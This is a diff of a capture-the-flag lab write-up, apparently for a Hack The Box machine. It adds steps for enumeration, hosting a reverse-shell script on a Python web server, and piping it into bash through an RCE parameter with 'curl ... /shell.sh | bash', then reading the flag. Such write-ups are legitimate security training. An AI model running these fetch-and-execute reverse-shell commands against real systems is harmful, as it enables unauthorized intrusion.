@@ -7,6 +7,9 @@
 
 
 ## Recon & Enumeration
+
+### Web Enumeration 
+
  Scanned target for open ports 
  ```bash
 sudo nmap -sV 10.129.126.39
@@ -27,9 +30,9 @@ Found contact form containing a reference to a .php page indicating the web appl
 
 Navigated to the broken Contact page which contained an email "thetoppers.htb"
 
----
 
-***Subdomain Enumeration***
+
+### Subdomain Enumeration
 
 Began subdomain enumeration of the target by appending "thetoppers.htb"
 
@@ -112,24 +115,37 @@ nc -lvnp 1337
 Started a Python Web Server to host the reverse shell payload, allowing the compromised host to access it over HTTP
 
 ```bash
-
+python3 -m http.server 8000
 ```
 
+#### Executing the payload ####
+
+
+Using the previously established Remote Code Execution (RCE), inserted a bash command into the `cmd` URL parameter causing the server to fetch the reverse shell payload that hosted on the Python Web Server. Used the pipe to pass the downloaded script was then piped directly into `bash` for execution.
+
+
+```bash 
+curl 10.10.17.95:8000/shell.sh | bash 
+```
+![Rev-Shell-Upload](Images/three_rev-shell-url.jpeg)
+
+
+---
+
+
+## Post Exploitation
+
+Received an interactive shell under 'www-data'
+
+Retrieved flag contents from the path 
+
+```bash 
+cat /var/www/flag.txt 
+```
+![Flag-Pic](Images/three_flag.jpeg)
 
 
 
-
-
-### Post Exploitation
-
-**Lateral Movement**
-
-
-
-**Privilege Escalation**
-
-
-
-### Key Takeaway
+## Key Takeaway
 
 
